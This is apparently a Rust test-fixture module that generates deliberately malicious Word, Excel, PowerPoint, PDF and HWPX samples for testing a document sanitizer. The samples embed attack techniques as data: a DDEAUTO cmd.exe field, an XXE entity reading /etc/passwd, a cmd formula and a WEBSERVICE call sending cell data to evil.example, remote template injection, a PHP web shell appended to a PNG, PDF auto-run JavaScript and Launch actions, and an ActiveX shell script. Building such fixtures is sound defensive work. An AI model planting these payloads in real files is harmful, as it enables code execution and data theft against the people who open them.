//! 테스트용 악성/정상 샘플 생성기.
#![allow(dead_code)]

pub mod legacy;
pub mod metafile;
pub mod msg;
pub mod pdf_inline;

use std::io::{Cursor, Read, Write};

use lopdf::content::{Content, Operation};
use lopdf::{dictionary, Dictionary, Document, Object, Stream, StringFormat};

pub const CT: &str = "http://schemas.openxmlformats.org/package/2006/content-types";
pub const PR: &str = "http://schemas.openxmlformats.org/package/2006/relationships";
pub const R: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
pub const W: &str = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
pub const S: &str = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
pub const REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

pub fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);
    for (name, data) in files {
        w.start_file(*name, opts).unwrap();
        w.write_all(data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

pub fn unzip(data: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut a = zip::ZipArchive::new(Cursor::new(data)).unwrap();
    let mut out = Vec::new();
    for i in 0..a.len() {
        let mut f = a.by_index(i).unwrap();
        let mut buf = Vec::new();
        f.read_to_end(&mut buf).unwrap();
        out.push((f.name().to_string(), buf));
    }
    out
}

pub fn part(parts: &[(String, Vec<u8>)], name: &str) -> String {
    parts
        .iter()
        .find(|(n, _)| n == name)
        .map(|(_, d)| String::from_utf8_lossy(d).to_string())
        .unwrap_or_else(|| panic!("파트 없음: {name}"))
}

pub fn png_with_payload() -> Vec<u8> {
    let img = image::RgbImage::from_pixel(8, 8, image::Rgb([200, 30, 30]));
    let mut buf = Cursor::new(Vec::new());
    img.write_to(&mut buf, image::ImageFormat::Png).unwrap();
    let mut data = buf.into_inner();
    data.extend_from_slice(b"PK\x03\x04<?php system($_GET['c']); ?>");
    data
}

// ------------------------------------------------------------------------- Word
pub fn malicious_docm() -> Vec<u8> {
    let content_types = format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{CT}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
</Types>"#
    );
    let root_rels = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="{PR}">
  <Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="{REL}/custom-properties" Target="docProps/custom.xml"/>
  <Relationship Id="rId4" Type="{REL}/extended-properties" Target="docProps/app.xml"/>
</Relationships>"#
    );
    let doc_rels = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="{PR}">
  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="{REL}/settings" Target="settings.xml"/>
  <Relationship Id="rId3" Type="{REL}/hyperlink" Target="https://example.com/" TargetMode="External"/>
  <Relationship Id="rId4" Type="{REL}/hyperlink" Target="file://attacker/share/evil.exe" TargetMode="External"/>
  <Relationship Id="rId5" Type="{REL}/oleObject" Target="embeddings/oleObject1.bin"/>
  <Relationship Id="rId6" Type="{REL}/image" Target="media/image1.png"/>
  <Relationship Id="rId7" Type="{REL}/image" Target="\\10.0.0.1\share\track.png" TargetMode="External"/>
  <Relationship Id="rId8" Type="{REL}/aFChunk" Target="afchunk.rtf"/>
  <Relationship Id="rId9" Type="{REL}/styles" Target="styles.xml"/>
</Relationships>"#
    );
    let settings_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}">
  <Relationship Id="rId1" Type="{REL}/attachedTemplate" Target="http://evil.example/template.dotm" TargetMode="External"/>
</Relationships>"#
    );
    let settings = format!(
        r#"<?xml version="1.0"?><w:settings xmlns:w="{W}" xmlns:r="{R}"><w:attachedTemplate r:id="rId1"/><w:docVars><w:docVar w:name="x" w:val="y"/></w:docVars><w:zoom w:percent="100"/></w:settings>"#
    );
    let document = format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}" xmlns:r="{R}" xmlns:o="urn:schemas-microsoft-com:office:office"
  xmlns:v="urn:schemas-microsoft-com:vml" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
  xmlns:evil="http://evil.example/ns">
<w:body>
  <w:p><w:r><w:t>안전한 본문 &amp; 기호</w:t></w:r></w:p>
  <w:p><w:hyperlink r:id="rId3"><w:r><w:t>정상 링크</w:t></w:r></w:hyperlink></w:p>
  <w:p><w:hyperlink r:id="rId4"><w:r><w:t>악성 링크</w:t></w:r></w:hyperlink></w:p>
  <w:p>
    <w:r><w:fldChar w:fldCharType="begin"/></w:r>
    <w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r>
    <w:r><w:instrText xml:space="preserve">EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>
    <w:r><w:fldChar w:fldCharType="separate"/></w:r>
    <w:r><w:t>결과</w:t></w:r>
    <w:r><w:fldChar w:fldCharType="end"/></w:r>
  </w:p>
  <w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil.example/x.png&quot; "><w:r><w:t>그림</w:t></w:r></w:fldSimple></w:p>
  <w:p><w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p>
  <w:p><w:r><w:object><v:shape id="s1"><v:imagedata o:href="file://10.0.0.1/x.png"/></v:shape><o:OLEObject Type="Embed" ProgID="Package" r:id="rId5"/></w:object></w:r></w:p>
  <w:p><w:r><w:drawing><a:blip r:embed="rId6"/><a:blip r:link="rId7"/></w:drawing></w:r></w:p>
  <w:altChunk r:id="rId8"/>
  <evil:payload>숨겨진 데이터</evil:payload>
</w:body></w:document>"#
    );
    let styles = format!(r#"<?xml version="1.0"?><w:styles xmlns:w="{W}"/>"#);
    let core = r#"<?xml version="1.0"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
 xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>보고서</dc:title><dc:creator>홍길동</dc:creator><cp:lastModifiedBy>attacker</cp:lastModifiedBy></cp:coreProperties>"#;
    let app = r#"<?xml version="1.0"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><Company>ACME</Company><HyperlinkBase>\\evil\share\</HyperlinkBase></Properties>"#;
    let png = png_with_payload();
    make_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", root_rels.as_bytes()),
        ("word/document.xml", document.as_bytes()),
        ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
        ("word/settings.xml", settings.as_bytes()),
        ("word/_rels/settings.xml.rels", settings_rels.as_bytes()),
        ("word/styles.xml", styles.as_bytes()),
        ("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1Attribute VB_Name AutoOpen Shell"),
        ("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1MZ-payload"),
        ("word/afchunk.rtf", b"{\\rtf1 {\\object}}"),
        ("word/media/image1.png", &png),
        ("word/hidden/stash.bin", b"MZ hidden executable"),
        ("docProps/core.xml", core.as_bytes()),
        ("docProps/app.xml", app.as_bytes()),
        ("docProps/custom.xml", b"<?xml version=\"1.0\"?><Properties xmlns=\"http://schemas.openxmlformats.org/officeDocument/2006/custom-properties\"/>"),
    ])
}

pub fn xxe_docx() -> Vec<u8> {
    let doc = format!(
        r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"#
    );
    let rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/></Relationships>"#
    );
    make_zip(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("_rels/.rels", rels.as_bytes()),
        ("word/document.xml", doc.as_bytes()),
    ])
}

// ------------------------------------------------------------------------- Excel
pub fn malicious_xlsm() -> Vec<u8> {
    let root_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>"#
    );
    let wb_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}">
  <Relationship Id="rId1" Type="{REL}/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet2.xml"/>
  <Relationship Id="rId3" Type="{REL}/externalLink" Target="externalLinks/externalLink1.xml"/>
  <Relationship Id="rId4" Type="{REL}/connections" Target="connections.xml"/>
</Relationships>"#
    );
    let workbook = format!(
        r#"<?xml version="1.0"?>
<workbook xmlns="{S}" xmlns:r="{R}">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/></sheets>
  <externalReferences><externalReference r:id="rId3"/></externalReferences>
  <definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName><definedName name="Data">Sheet1!$A$1</definedName></definedNames>
</workbook>"#
    );
    let sheet = format!(
        r#"<?xml version="1.0"?>
<worksheet xmlns="{S}"><sheetData>
  <row r="1"><c r="A1"><f>SUM(1,2)</f><v>3</v></c></row>
  <row r="2"><c r="A2"><f>cmd|'/C calc.exe'!A0</f><v>0</v></c></row>
  <row r="3"><c r="A3"><f>WEBSERVICE("http://evil.example/?"&amp;A1)</f><v>0</v></c></row>
</sheetData></worksheet>"#
    );
    let macro_sheet = format!(
        r#"<?xml version="1.0"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData xmlns="{S}"/></xm:macrosheet>"#
    );
    make_zip(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("_rels/.rels", root_rels.as_bytes()),
        ("xl/workbook.xml", workbook.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/worksheets/sheet1.xml", sheet.as_bytes()),
        ("xl/macrosheets/sheet2.xml", macro_sheet.as_bytes()),
        ("xl/externalLinks/externalLink1.xml", b"<externalLink/>"),
        ("xl/connections.xml", b"<connections/>"),
    ])
}

// ------------------------------------------------------------------------- PowerPoint
pub fn malicious_ppsm() -> Vec<u8> {
    let root_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="ppt/presentation.xml"/></Relationships>"#
    );
    let pres_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}"><Relationship Id="rId2" Type="{REL}/slide" Target="slides/slide1.xml"/></Relationships>"#
    );
    let pres = format!(
        r#"<?xml version="1.0"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:r="{R}"><p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst></p:presentation>"#
    );
    let slide = format!(
        r#"<?xml version="1.0"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
 xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="{R}">
<p:cSld><p:spTree>
  <p:sp><p:nvSpPr><p:cNvPr id="2" name="btn"><a:hlinkClick r:id="rId2" action="ppaction://program"/></p:cNvPr></p:nvSpPr></p:sp>
  <p:sp><p:nvSpPr><p:cNvPr id="3" name="hover"><a:hlinkMouseOver r:id="" action="ppaction://macro?name=Evil"/></p:cNvPr></p:nvSpPr></p:sp>
  <p:sp><p:nvSpPr><p:cNvPr id="4" name="ok"><a:hlinkClick r:id="" action="ppaction://hlinkshowjump?jump=nextslide"/></p:cNvPr></p:nvSpPr></p:sp>
  <p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="5" name="ole"/></p:nvGraphicFramePr><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj r:id="rId3" progId="Package"/></a:graphicData></a:graphic></p:graphicFrame>
</p:spTree></p:cSld></p:sld>"#
    );
    let slide_rels = format!(
        r#"<?xml version="1.0"?><Relationships xmlns="{PR}">
  <Relationship Id="rId2" Type="{REL}/hyperlink" Target="c:\windows\system32\calc.exe" TargetMode="External"/>
  <Relationship Id="rId3" Type="{REL}/oleObject" Target="../embeddings/oleObject1.bin"/>
</Relationships>"#
    );
    make_zip(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("_rels/.rels", root_rels.as_bytes()),
        ("ppt/presentation.xml", pres.as_bytes()),
        ("ppt/_rels/presentation.xml.rels", pres_rels.as_bytes()),
        ("ppt/slides/slide1.xml", slide.as_bytes()),
        ("ppt/slides/_rels/slide1.xml.rels", slide_rels.as_bytes()),
        (
            "ppt/embeddings/oleObject1.bin",
            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
        ),
    ])
}

// ------------------------------------------------------------------------- PDF
fn text_page(
    doc: &mut Document,
    pages_id: lopdf::ObjectId,
    font_id: lopdf::ObjectId,
    text: &str,
    extra_ops: Vec<Operation>,
) -> lopdf::ObjectId {
    let mut ops = vec![
        Operation::new("BT", vec![]),
        Operation::new("Tf", vec!["F1".into(), 24.into()]),
        Operation::new("Td", vec![50.into(), 700.into()]),
        Operation::new("Tj", vec![Object::string_literal(text)]),
        Operation::new("ET", vec![]),
    ];
    ops.extend(extra_ops);
    let content = Content { operations: ops };
    let content_id = doc.add_object(Stream::new(dictionary! {}, content.encode().unwrap()));
    doc.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => pages_id,
        "Contents" => content_id,
        "Resources" => dictionary! { "Font" => dictionary! { "F1" => font_id } },
    })
}

pub fn clean_pdf() -> Vec<u8> {
    let mut doc = Document::with_version("1.5");
    let pages_id = doc.new_object_id();
    let font_id = doc.add_object(
        dictionary! { "Type" => "Font", "Subtype" => "Type1", "BaseFont" => "Helvetica" },
    );
    let page = text_page(&mut doc, pages_id, font_id, "Hello CDR", vec![]);
    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages", "Kids" => vec![page.into()], "Count" => 1,
            "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
        }),
    );
    let catalog = doc.add_object(dictionary! { "Type" => "Catalog", "Pages" => pages_id });
    doc.trailer.set("Root", catalog);
    let mut out = Vec::new();
    doc.save_to(&mut out).unwrap();
    out
}

pub fn malicious_pdf() -> Vec<u8> {
    let mut doc = Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let font_id = doc.add_object(
        dictionary! { "Type" => "Font", "Subtype" => "Type1", "BaseFont" => "Helvetica" },
    );

    // 콘텐츠에 비표준 연산자와 BDC 속성 삽입
    let extra = vec![
        Operation::new("PS", vec![Object::string_literal("{ evil } exec")]),
        Operation::new("BDC", vec!["OC".into(), dictionary! { "MCID" => 0 }.into()]),
        Operation::new("EMC", vec![]),
    ];
    let page1 = text_page(&mut doc, pages_id, font_id, "Page One", extra);
    let page2 = text_page(&mut doc, pages_id, font_id, "Page Two", vec![]);

    let js = doc.add_object(
        dictionary! { "S" => "JavaScript", "JS" => Object::string_literal("app.alert('pwned')") },
    );
    let ef = doc.add_object(Stream::new(
        dictionary! { "Type" => "EmbeddedFile" },
        b"MZ\x90\x00 evil executable".to_vec(),
    ));
    let filespec = doc.add_object(dictionary! { "Type" => "Filespec", "F" => Object::string_literal("evil.exe"), "EF" => dictionary! { "F" => ef } });

    let launch = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "Link", "Rect" => vec![0.into(), 0.into(), 50.into(), 50.into()],
        "A" => dictionary! { "S" => "Launch", "F" => Object::string_literal("cmd.exe") },
    });
    let good = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "Link", "Rect" => vec![50.into(), 0.into(), 100.into(), 50.into()],
        "A" => dictionary! { "S" => "URI", "URI" => Object::string_literal("https://example.com/") },
    });
    let bad = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "Link", "Rect" => vec![100.into(), 0.into(), 150.into(), 50.into()],
        "A" => dictionary! { "S" => "URI", "URI" => Object::string_literal("file:///c:/windows/system32/calc.exe") },
    });
    let goto = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "Link", "Rect" => vec![150.into(), 0.into(), 200.into(), 50.into()],
        "Dest" => vec![page2.into(), "Fit".into()],
    });
    let attach = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "FileAttachment", "Rect" => vec![200.into(), 0.into(), 220.into(), 20.into()], "FS" => filespec,
    });
    // 외형을 가진 폼 필드(위젯): 평면화 대상
    let ap = doc.add_object(Stream::new(
        dictionary! { "Type" => "XObject", "Subtype" => "Form", "BBox" => vec![0.into(), 0.into(), 100.into(), 20.into()] },
        b"0 0 1 rg 0 0 100 20 re f".to_vec(),
    ));
    let widget = doc.add_object(dictionary! {
        "Type" => "Annot", "Subtype" => "Widget", "FT" => "Tx", "T" => Object::string_literal("name"),
        "Rect" => vec![300.into(), 300.into(), 400.into(), 320.into()],
        "AP" => dictionary! { "N" => ap },
        "AA" => dictionary! { "K" => js },
    });
    {
        let p = doc.get_object_mut(page1).unwrap().as_dict_mut().unwrap();
        p.set(
            "Annots",
            vec![
                launch.into(),
                good.into(),
                bad.into(),
                goto.into(),
                attach.into(),
                widget.into(),
            ],
        );
        p.set("AA", dictionary! { "O" => js });
    }

    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages", "Kids" => vec![page1.into(), page2.into()], "Count" => 2,
            "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
        }),
    );
    let outline_item = doc.new_object_id();
    let outlines = doc.add_object(dictionary! { "Type" => "Outlines", "First" => outline_item, "Last" => outline_item, "Count" => 1 });
    doc.objects.insert(
        outline_item,
        Object::Dictionary(dictionary! {
            "Title" => Object::String("둘째 쪽".as_bytes().to_vec(), StringFormat::Literal),
            "Parent" => outlines,
            "A" => dictionary! { "S" => "GoTo", "D" => vec![page2.into(), "Fit".into()] },
        }),
    );
    let xfa = doc.add_object(Stream::new(Dictionary::new(), b"<xdp/>".to_vec()));
    let catalog = doc.add_object(dictionary! {
        "Type" => "Catalog", "Pages" => pages_id, "Outlines" => outlines,
        "OpenAction" => js,
        "AA" => dictionary! { "WC" => js },
        "Names" => dictionary! {
            "JavaScript" => dictionary! { "Names" => vec![Object::string_literal("a"), js.into()] },
            "EmbeddedFiles" => dictionary! { "Names" => vec![Object::string_literal("evil.exe"), filespec.into()] },
        },
        "AcroForm" => dictionary! { "Fields" => vec![widget.into()], "XFA" => xfa },
    });
    doc.trailer.set("Root", catalog);
    let info = doc.add_object(dictionary! { "Author" => Object::string_literal("attacker") });
    doc.trailer.set("Info", info);

    let mut out = Vec::new();
    doc.save_to(&mut out).unwrap();
    out.extend_from_slice(b"\nHIDDEN-PAYLOAD-HIDDEN-PAYLOAD");
    out
}

// ------------------------------------------------------------------------- HWPX
pub const HP: &str = "http://www.hancom.co.kr/hwpml/2011/paragraph";
pub const HC: &str = "http://www.hancom.co.kr/hwpml/2011/core";
pub const HS: &str = "http://www.hancom.co.kr/hwpml/2011/section";
pub const HH: &str = "http://www.hancom.co.kr/hwpml/2011/head";
pub const OPF: &str = "http://www.idpf.org/2007/opf/";

pub fn malicious_hwpx() -> Vec<u8> {
    let manifest = format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<opf:package xmlns:opf="{OPF}" xmlns:dc="http://purl.org/dc/elements/1.1/" version="" unique-identifier="" id="">
  <opf:metadata><opf:title>공문</opf:title><opf:meta name="creator" content="text">홍길동</opf:meta></opf:metadata>
  <opf:manifest>
    <opf:item id="header" href="Contents/header.xml" media-type="application/xml"/>
    <opf:item id="section0" href="Contents/section0.xml" media-type="application/xml"/>
    <opf:item id="image1" href="BinData/image1.png" media-type="image/png" isEmbeded="1"/>
    <opf:item id="ole1" href="BinData/ole1.ole" media-type="application/ole" isEmbeded="1"/>
    <opf:item id="exe1" href="BinData/tool.bin" media-type="application/octet-stream" isEmbeded="1"/>
    <opf:item id="remote" href="http://evil.example/track.png" media-type="image/png" isEmbeded="0"/>
    <opf:item id="script" href="Scripts/sourceScripts" media-type="application/x-javascript"/>
  </opf:manifest>
  <opf:spine><opf:itemref idref="header" linear="yes"/><opf:itemref idref="section0" linear="yes"/></opf:spine>
</opf:package>"#
    );
    let header = format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<hh:head xmlns:hh="{HH}" version="1.4" secCnt="1"><hh:refList><hh:fontfaces itemCnt="1"><hh:fontface lang="HANGUL" fontCnt="1"><hh:font id="0" face="함초롬바탕" type="TTF" isEmbedded="1" binaryItemIDRef="exe1"/></hh:fontface></hh:fontfaces></hh:refList></hh:head>"#
    );
    let section = format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<hs:sec xmlns:hs="{HS}" xmlns:hp="{HP}" xmlns:hc="{HC}" xmlns:evil="http://evil.example/ns">
  <hp:p id="1"><hp:run charPrIDRef="0"><hp:t>안전한 본문 &amp; 기호</hp:t></hp:run></hp:p>
  <hp:p id="2"><hp:run charPrIDRef="0">
    <hp:ctrl><hp:fieldBegin id="10" type="HYPERLINK" name=""><hp:parameters cnt="2" name="">
      <hp:stringParam name="Command">file\://attacker/share/evil.exe;1;0;0;</hp:stringParam>
      <hp:stringParam name="Path">file://attacker/share/evil.exe</hp:stringParam>
    </hp:parameters></hp:fieldBegin></hp:ctrl>
    <hp:t>악성 링크</hp:t>
    <hp:ctrl><hp:fieldEnd beginIDRef="10"/></hp:ctrl>
  </hp:run></hp:p>
  <hp:p id="3"><hp:run charPrIDRef="0">
    <hp:ctrl><hp:fieldBegin id="11" type="HYPERLINK" name=""><hp:parameters cnt="1" name="">
      <hp:stringParam name="Path">https://example.com/</hp:stringParam>
    </hp:parameters></hp:fieldBegin></hp:ctrl>
    <hp:t>정상 링크</hp:t>
  </hp:run></hp:p>
  <hp:p id="4"><hp:run charPrIDRef="0"><hp:pic id="20"><hc:img binaryItemIDRef="image1"/></hp:pic></hp:run></hp:p>
  <hp:p id="5"><hp:run charPrIDRef="0"><hp:pic id="21"><hp:sz width="10"/><hc:img binaryItemIDRef="remote"/></hp:pic></hp:run></hp:p>
  <hp:p id="6"><hp:run charPrIDRef="0"><hp:ole id="30" binaryItemIDRef="ole1"/></hp:run></hp:p>
  <evil:payload>숨겨진 데이터</evil:payload>
</hs:sec>"#
    );
    let container = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ocf:container xmlns:ocf="urn:oasis:names:tc:opendocument:xmlns:container"><ocf:rootfiles>
<ocf:rootfile full-path="Contents/content.hpf" media-type="application/hwpml-package+xml"/>
<ocf:rootfile full-path="Scripts/sourceScripts" media-type="application/x-javascript"/>
</ocf:rootfiles></ocf:container>"#;
    let version = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><hv:HCFVersion xmlns:hv="http://www.hancom.co.kr/hwpml/2011/version" major="5" minor="1"/>"#;
    let png = png_with_payload();
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let stored =
        zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    w.start_file("mimetype", stored).unwrap();
    w.write_all(b"application/hwp+zip").unwrap();
    let opts = zip::write::SimpleFileOptions::default();
    let files: Vec<(&str, &[u8])> = vec![
        ("version.xml", version.as_bytes()),
        ("META-INF/container.xml", container.as_bytes()),
        ("Contents/content.hpf", manifest.as_bytes()),
        ("Contents/header.xml", header.as_bytes()),
        ("Contents/section0.xml", section.as_bytes()),
        ("BinData/image1.png", &png),
        (
            "BinData/ole1.ole",
            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1payload",
        ),
        ("BinData/tool.bin", b"MZ\x90\x00 executable"),
        (
            "Scripts/sourceScripts",
            "function OnDocument_New(){ new ActiveXObject('WScript.Shell').Run('calc'); }"
                .as_bytes(),
        ),
        ("Scripts/headerScripts", b"var x;"),
        ("Preview/PrvText.txt", "공문 미리보기\u{0007}".as_bytes()),
        ("hidden/stash.bin", b"secret"),
    ];
    for (n, d) in files {
        w.start_file(n, opts).unwrap();
        w.write_all(d).unwrap();
    }
    w.finish().unwrap().into_inner()
}
